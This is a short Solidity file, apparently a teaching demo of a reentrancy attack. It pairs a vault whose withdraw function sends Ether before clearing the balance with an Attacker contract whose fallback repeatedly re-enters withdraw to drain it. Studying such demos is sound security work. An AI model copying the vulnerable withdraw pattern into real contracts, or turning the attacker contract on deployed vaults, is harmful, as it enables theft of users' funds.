// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract VulnerableVault {
    mapping(address => uint) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balance[msg.sender] > 0, "No balance");
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(success, "Transfer failed");

        balance[msg.sender] = 0;
    }

}


contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    receive() external payable {
        // 冲入攻击，只要合约金额大于1就会一直被提款
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
     }

     function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 Ether");
        target.deposit{value: 1 ether}();
        target.withdraw();
     }
}